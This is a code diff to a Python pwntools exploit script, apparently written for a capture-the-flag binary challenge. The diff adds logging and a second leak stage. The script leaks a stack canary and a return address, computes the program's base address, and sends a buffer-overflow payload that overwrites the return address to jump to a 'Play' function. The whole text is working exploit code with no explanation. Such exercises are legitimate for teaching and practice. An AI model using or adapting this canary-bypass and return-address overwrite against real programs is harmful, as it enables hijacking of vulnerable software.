@@ -11,6 +11,8 @@ except:
 	print("no ROP for you!")
 	sys.exit(1)
 
+def tag(a,b):
+	log.info('Address {}: {}'.format(a,hex(b)))
 # pause()
 p.sendline('1')
 time.sleep(0.5)
@@ -35,14 +37,31 @@ p.recvuntil('can')
 canary=p.recv(8)
 canary=bytearray(canary)
 canary[0]=b'\x00'
-log.info('canary:'+hex(u64(canary)))
+canary=u64(canary)
+# log.info('canary:'+hex(u64(canary)))
+tag('canary',canary)
 time.sleep(0.5)
 # p.sendline(canary)
-print hex(pop_rdi)
-print hex(elf.sym['main'])
-pay1='END'+(0x28-3)*'a'+canary+'a'*8
-
-p.sendline(pay1)
+# print hex(pop_rdi)
+# print hex(elf.sym['main'])
+# pay1='END'+(0x28-3)*'a'+canary+'#'*10
+pay='a'*(0x38-8)+'\x00'
+p.send(pay)
+time.sleep(0.5)
+ret=p.recv(8)
+ret=u64(ret.ljust(8,'\x00'))
+# log.info('ret:'+hex(ret))
+tag('ret',ret)
+text_base=ret-0xfb1
+tag('text_base',text_base)
+Play=text_base+elf.sym['Play']
+tag('Play',Play)
+# time.sleep(0.5)
+# p.recvuntil('ret')
+# ret=p.recv(8)
+# log.info('ret: '+ret)
+p.sendline('END'+cyclic(0x28-3)+p64(canary)+'a'*8+p64(Play))
+# p.sendline('END')
 # p.send(canary)
 # p.send(cyclic(0x28)+canary+'a'*200)
 # p.sendline('2')
